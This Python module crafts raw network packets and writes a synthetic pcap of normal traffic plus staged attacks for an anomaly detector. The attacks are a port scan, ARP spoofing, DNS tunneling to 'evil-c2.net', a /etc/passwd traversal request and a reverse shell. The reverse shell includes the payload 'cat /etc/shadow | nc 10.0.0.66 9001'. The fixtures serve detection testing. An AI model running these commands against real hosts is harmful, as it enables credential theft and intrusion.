"""Build packets byte by byte, and generate a demo capture full of interesting traffic.

This is the reverse of the decoder: each function packs one header with
``struct`` and computes the real checksums, so the output is a valid pcap that
Wireshark opens too. ``write_sample`` uses it to script a small network story:
DNS, an HTTP session with loss and reordering, TLS, ping, fragmentation, and a
handful of attacks for the anomaly detector to catch.
"""
from __future__ import annotations

import random
import socket
import struct

from .decoder import inet_checksum
from .pcap import PcapWriter

FIN, SYN, RST, PSH, ACK, URG = 0x01, 0x02, 0x04, 0x08, 0x10, 0x20


def mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def ethernet(src: str, dst: str, etype: int, payload: bytes) -> bytes:
    return mac(dst) + mac(src) + struct.pack("!H", etype) + payload


def ipv4(src: str, dst: str, proto: int, payload: bytes, ttl: int = 64, ident: int = 0,
         df: bool = True, mf: bool = False, frag_offset: int = 0, total_len: int | None = None) -> bytes:
    flags = (0x4000 if df else 0) | (0x2000 if mf else 0) | (frag_offset // 8)
    tl = total_len if total_len is not None else 20 + len(payload)
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tl, ident, flags, ttl, proto, 0,
                      socket.inet_aton(src), socket.inet_aton(dst))
    hdr = hdr[:10] + struct.pack("!H", inet_checksum(hdr)) + hdr[12:]
    return hdr + payload


def ipv6(src: str, dst: str, nxt: int, payload: bytes, hlim: int = 64) -> bytes:
    return struct.pack("!IHBB", 6 << 28, len(payload), nxt, hlim) + \
        socket.inet_pton(socket.AF_INET6, src) + socket.inet_pton(socket.AF_INET6, dst) + payload


def _pseudo(src: str, dst: str, proto: int, length: int) -> bytes:
    if ":" in src:
        return socket.inet_pton(socket.AF_INET6, src) + socket.inet_pton(socket.AF_INET6, dst) + \
            struct.pack("!I3xB", length, proto)
    return socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, proto, length)


def tcp(src: str, dst: str, sport: int, dport: int, seq: int, ack: int, flags: int, payload: bytes = b"",
        window: int = 64240, options: bytes = b"") -> bytes:
    if len(options) % 4:
        options += b"\x00" * (4 - len(options) % 4)
    off = (20 + len(options)) // 4
    hdr = struct.pack("!HHIIHHHH", sport, dport, seq & 0xFFFFFFFF, ack & 0xFFFFFFFF,
                      (off << 12) | flags, window, 0, 0) + options
    seg = hdr + payload
    csum = inet_checksum(_pseudo(src, dst, 6, len(seg)) + seg)
    return seg[:16] + struct.pack("!H", csum) + seg[18:]


def udp(src: str, dst: str, sport: int, dport: int, payload: bytes) -> bytes:
    seg = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload
    csum = inet_checksum(_pseudo(src, dst, 17, len(seg)) + seg) or 0xFFFF
    return seg[:6] + struct.pack("!H", csum) + seg[8:]


def icmp_echo(ident: int, seq: int, payload: bytes, reply: bool = False) -> bytes:
    msg = struct.pack("!BBHHH", 0 if reply else 8, 0, 0, ident, seq) + payload
    return msg[:2] + struct.pack("!H", inet_checksum(msg)) + msg[4:]


def icmp_unreachable(code: int, original: bytes) -> bytes:
    msg = struct.pack("!BBHI", 3, code, 0, 0) + original[:28]
    return msg[:2] + struct.pack("!H", inet_checksum(msg)) + msg[4:]


def arp(op: int, sender_mac: str, sender_ip: str, target_mac: str, target_ip: str) -> bytes:
    return struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + mac(sender_mac) + socket.inet_aton(sender_ip) + \
        mac(target_mac) + socket.inet_aton(target_ip)


def dns_name(name: str) -> bytes:
    out = b""
    for label in name.rstrip(".").split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"


def dns_query(ident: int, name: str, qtype: int = 1) -> bytes:
    return struct.pack("!HHHHHH", ident, 0x0100, 1, 0, 0, 0) + dns_name(name) + struct.pack("!HH", qtype, 1)


def dns_response(ident: int, name: str, answers: list[tuple[int, bytes]], qtype: int = 1, rcode: int = 0) -> bytes:
    msg = struct.pack("!HHHHHH", ident, 0x8180 | rcode, 1, len(answers), 0, 0) + dns_name(name) + \
        struct.pack("!HH", qtype, 1)
    for rtype, rdata in answers:
        msg += b"\xc0\x0c" + struct.pack("!HHIH", rtype, 1, 300, len(rdata)) + rdata  # pointer to qname
    return msg


def tcp_mss_options(mss: int = 1460, wscale: int = 7) -> bytes:
    return struct.pack("!BBH", 2, 4, mss) + b"\x01" + struct.pack("!BBB", 3, 3, wscale) + b"\x04\x02\x00\x00"


def tls_client_hello(sni: str) -> bytes:
    name = sni.encode()
    sni_ext = struct.pack("!HHHBH", 0, len(name) + 5, len(name) + 3, 0, len(name)) + name
    alpn = b"\x02h2\x08http/1.1"
    alpn_ext = struct.pack("!HHH", 16, len(alpn) + 2, len(alpn)) + alpn
    versions = struct.pack("!HHB", 43, 5, 4) + struct.pack("!HH", 0x0304, 0x0303)
    exts = sni_ext + alpn_ext + versions
    body = struct.pack("!H", 0x0303) + bytes(32) + b"\x00" + struct.pack("!H", 4) + \
        struct.pack("!HH", 0x1301, 0x1302) + b"\x01\x00" + struct.pack("!H", len(exts)) + exts
    hs = bytes([1]) + struct.pack("!I", len(body))[1:] + body
    return struct.pack("!BHH", 22, 0x0301, len(hs)) + hs


class Scenario:
    """Accumulates timestamped frames and writes them out as a pcap."""

    def __init__(self, start: float = 1_760_000_000.0):
        self.t = start
        self.frames: list[tuple[float, bytes]] = []

    def add(self, frame: bytes, dt: float = 0.001) -> None:
        self.t += dt
        self.frames.append((self.t, frame))

    def write(self, path: str) -> int:
        with PcapWriter(path) as w:
            for ts, data in sorted(self.frames, key=lambda f: f[0]):
                w.write(ts, data)
        return len(self.frames)


class TcpSession:
    """Plays both ends of a TCP connection so the scenario reads naturally."""

    def __init__(self, sc: Scenario, cmac: str, smac: str, cip: str, sip: str, cport: int, sport: int,
                 rtt: float = 0.02):
        self.sc, self.cmac, self.smac = sc, cmac, smac
        self.cip, self.sip, self.cport, self.sport = cip, sip, cport, sport
        self.cseq, self.sseq = random.randint(1, 2**31), random.randint(1, 2**31)
        self.rtt = rtt
        self.ident = random.randint(1, 30000)

    def _c(self, flags: int, payload: bytes = b"", dt: float = 0.0005, seq: int | None = None, opts: bytes = b"") -> None:
        self.ident += 1
        seg = tcp(self.cip, self.sip, self.cport, self.sport, self.cseq if seq is None else seq,
                  self.sseq, flags, payload, options=opts)
        self.sc.add(ethernet(self.cmac, self.smac, 0x0800, ipv4(self.cip, self.sip, 6, seg, ident=self.ident)), dt)

    def _s(self, flags: int, payload: bytes = b"", dt: float = 0.0005, seq: int | None = None, opts: bytes = b"") -> None:
        seg = tcp(self.sip, self.cip, self.sport, self.cport, self.sseq if seq is None else seq,
                  self.cseq, flags, payload, options=opts)
        self.sc.add(ethernet(self.smac, self.cmac, 0x0800, ipv4(self.sip, self.cip, 6, seg, ttl=56)), dt)

    def handshake(self) -> None:
        self._c(SYN, opts=tcp_mss_options())
        self.cseq += 1
        self._s(SYN | ACK, dt=self.rtt / 2, opts=tcp_mss_options(1400, 9))
        self.sseq += 1
        self._c(ACK, dt=self.rtt / 2)

    def client_send(self, data: bytes, dt: float = 0.001) -> None:
        self._c(PSH | ACK, data, dt)
        self.cseq += len(data)
        self._s(ACK, dt=self.rtt / 2)

    def server_send(self, data: bytes, mss: int = 1400, reorder: bool = False, retransmit: bool = False) -> None:
        chunks = [data[i:i + mss] for i in range(0, len(data), mss)]
        seqs = []
        for c in chunks:
            seqs.append((self.sseq, c))
            self.sseq += len(c)
        order = list(seqs)
        if reorder and len(order) >= 3:
            order[1], order[2] = order[2], order[1]  # segment 3 overtakes segment 2
        for i, (seq, c) in enumerate(order):
            self._s(PSH | ACK if i == len(order) - 1 else ACK, c, dt=self.rtt / 2 if i == 0 else 0.0003, seq=seq)
        if retransmit and seqs:
            seq, c = seqs[0]
            self._s(ACK, c, dt=0.2, seq=seq)  # spurious RTO retransmission
        self._c(ACK, dt=self.rtt / 2)

    def close(self) -> None:
        self._c(FIN | ACK, dt=0.01)
        self.cseq += 1
        self._s(FIN | ACK, dt=self.rtt / 2)
        self.sseq += 1
        self._c(ACK, dt=self.rtt / 2)


def write_sample(path: str, seed: int = 7) -> int:
    """Write the demo capture; returns the number of packets written."""
    random.seed(seed)
    sc = Scenario()
    me, gw, srv = "10.0.0.23", "10.0.0.1", "93.184.216.34"
    me_mac, gw_mac = "3c:22:fb:12:34:56", "00:1a:2b:3c:4d:5e"
    attacker, attacker_mac = "10.0.0.66", "de:ad:be:ef:00:66"
    eth = lambda s, d, p: ethernet(s, d, 0x0800, p)

    # 1. ARP for the gateway
    sc.add(ethernet(me_mac, "ff:ff:ff:ff:ff:ff", 0x0806, arp(1, me_mac, me, "00:00:00:00:00:00", gw)))
    sc.add(ethernet(gw_mac, me_mac, 0x0806, arp(2, gw_mac, gw, me_mac, me)), 0.0004)

    # 2. DNS lookup, then HTTP with reordering and a retransmission
    q = dns_query(0x1a2b, "example.com")
    sc.add(eth(me_mac, gw_mac, ipv4(me, gw, 17, udp(me, gw, 53124, 53, q))), 0.01)
    r = dns_response(0x1a2b, "example.com", [(1, socket.inet_aton(srv))])
    sc.add(eth(gw_mac, me_mac, ipv4(gw, me, 17, udp(gw, me, 53, 53124, r))), 0.012)
    s = TcpSession(sc, me_mac, gw_mac, me, srv, 51544, 80, rtt=0.024)
    s.handshake()
    s.client_send(b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/8.4.0\r\n"
                  b"Accept: */*\r\n\r\n")
    body = (b"<!doctype html><html><head><title>Example Domain</title></head><body>"
            + b"<p>This domain is for use in illustrative examples in documents.</p>" * 60 + b"</body></html>")
    s.server_send(b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nServer: ECS (nyb/1D2E)\r\n"
                  b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body, reorder=True, retransmit=True)
    s.client_send(b"GET /favicon.ico HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/8.4.0\r\n\r\n")
    s.server_send(b"HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\nTransfer-Encoding: chunked\r\n\r\n"
                  b"9\r\nNot found\r\n0\r\n\r\n")
    s.close()

    # 3. HTTPS: DNS AAAA + A, TLS ClientHello with SNI
    sc.add(eth(me_mac, gw_mac, ipv4(me, gw, 17, udp(me, gw, 53125, 53, dns_query(0x2b3c, "github.com")))), 0.05)
    sc.add(eth(gw_mac, me_mac, ipv4(gw, me, 17, udp(gw, me, 53, 53125, dns_response(
        0x2b3c, "github.com", [(1, socket.inet_aton("140.82.112.3"))])))), 0.009)
    t = TcpSession(sc, me_mac, gw_mac, me, "140.82.112.3", 51560, 443, rtt=0.031)
    t.handshake()
    t.client_send(tls_client_hello("github.com"))
    t.server_send(struct.pack("!BHH", 22, 0x0303, 4) + b"\x02\x00\x00\x00" + struct.pack("!BHH", 23, 0x0303, 64)
                  + bytes(64))
    t.close()

    # 4. Ping, and a fragmented ping (2 fragments)
    for i in range(3):
        sc.add(eth(me_mac, gw_mac, ipv4(me, "1.1.1.1", 1, icmp_echo(0x77, i + 1, bytes(range(56))))), 0.2)
        sc.add(eth(gw_mac, me_mac, ipv4("1.1.1.1", me, 1, icmp_echo(0x77, i + 1, bytes(range(56)), True),
                                        ttl=58)), 0.011)
    big = icmp_echo(0x78, 1, bytes(i & 0xFF for i in range(2000)))
    sc.add(eth(me_mac, gw_mac, ipv4(me, "1.1.1.1", 1, big[:1480], ident=0x4242, df=False, mf=True,
                                    total_len=1500)), 0.1)
    sc.add(eth(me_mac, gw_mac, ipv4(me, "1.1.1.1", 1, big[1480:], ident=0x4242, df=False, frag_offset=1480,
                                    total_len=20 + len(big) - 1480)), 0.0001)

    # 5. IPv6 DNS query and an mDNS announcement
    sc.add(ethernet(me_mac, gw_mac, 0x86DD, ipv6("fe80::1c22:fbff:fe12:3456", "fe80::1",
                                                 17, udp("fe80::1c22:fbff:fe12:3456", "fe80::1", 53999, 53,
                                                         dns_query(0x3c4d, "ipv6.google.com", 28)))), 0.05)

    # --- the attacker shows up ------------------------------------------------
    # 6. SYN port scan of the host: closed ports answer RST, port 22 answers SYN-ACK
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 3306, 3389, 5900, 8080, 8443, 31337, 4444]
    for i, p in enumerate(ports):
        sp = 40000 + i
        sc.add(eth(attacker_mac, me_mac, ipv4(attacker, me, 6, tcp(attacker, me, sp, p, 1000, 0, SYN,
                                                                     window=1024))), 0.003)
        if p == 22:
            sc.add(eth(me_mac, attacker_mac, ipv4(me, attacker, 6, tcp(me, attacker, p, sp, 5555, 1001,
                                                                         SYN | ACK))), 0.0002)
            sc.add(eth(attacker_mac, me_mac, ipv4(attacker, me, 6, tcp(attacker, me, sp, p, 1001, 0, RST))),
                   0.0002)
        else:
            sc.add(eth(me_mac, attacker_mac, ipv4(me, attacker, 6, tcp(me, attacker, p, sp, 0, 1001,
                                                                         RST | ACK, window=0))), 0.0002)

    # 7. Stealth scans: Xmas and NULL
    sc.add(eth(attacker_mac, me_mac, ipv4(attacker, me, 6, tcp(attacker, me, 41001, 80, 1, 0, FIN | PSH | URG))), 0.01)
    sc.add(eth(attacker_mac, me_mac, ipv4(attacker, me, 6, tcp(attacker, me, 41002, 80, 1, 0, 0))), 0.01)

    # 8. ARP spoofing: the attacker claims to be the gateway
    sc.add(ethernet(attacker_mac, me_mac, 0x0806, arp(2, attacker_mac, gw, me_mac, me)), 0.05)

    # 9. DNS tunneling-style query
    chunk = "".join(random.choice("abcdefghijklmnopqrstuvwxyz234567") for _ in range(48))
    sc.add(eth(me_mac, gw_mac, ipv4(me, gw, 17, udp(me, gw, 53130, 53, dns_query(0x4d5e, f"{chunk}.t.evil-c2.net",
                                                                               16)))), 0.05)
    sc.add(eth(gw_mac, me_mac, ipv4(gw, me, 17, udp(gw, me, 53, 53130, dns_response(
        0x4d5e, f"{chunk}.t.evil-c2.net", [], 16, rcode=3)))), 0.02)

    # 10. Scanner hitting a web server with Basic auth and path traversal
    u = TcpSession(sc, attacker_mac, me_mac, attacker, me, 45000, 8080, rtt=0.001)
    u.handshake()
    u.client_send(b"GET /admin/../../etc/passwd HTTP/1.1\r\nHost: 10.0.0.23:8080\r\n"
                  b"User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)\r\n"
                  b"Authorization: Basic YWRtaW46aHVudGVyMg==\r\n\r\n")
    u.server_send(b"HTTP/1.1 403 Forbidden\r\nContent-Length: 9\r\nConnection: close\r\n\r\nForbidden")
    u.close()

    # 11. A reverse shell: the victim connects out to the attacker's port 4444
    rs = TcpSession(sc, me_mac, attacker_mac, me, attacker, 51700, 4444, rtt=0.002)
    rs.handshake()
    rs.server_send(b"whoami\n")
    rs.client_send(b"root\n")
    rs.server_send(b"cat /etc/shadow | nc 10.0.0.66 9001\n")
    rs.close()

    # 12. Refused connection (RST to SYN) and a reset mid-connection
    sc.add(eth(me_mac, gw_mac, ipv4(me, "10.0.0.50", 6, tcp(me, "10.0.0.50", 51600, 9000, 777, 0, SYN))), 0.1)
    sc.add(eth(gw_mac, me_mac, ipv4("10.0.0.50", me, 6, tcp("10.0.0.50", me, 9000, 51600, 0, 778, RST | ACK))), 0.001)
    return sc.write(path)
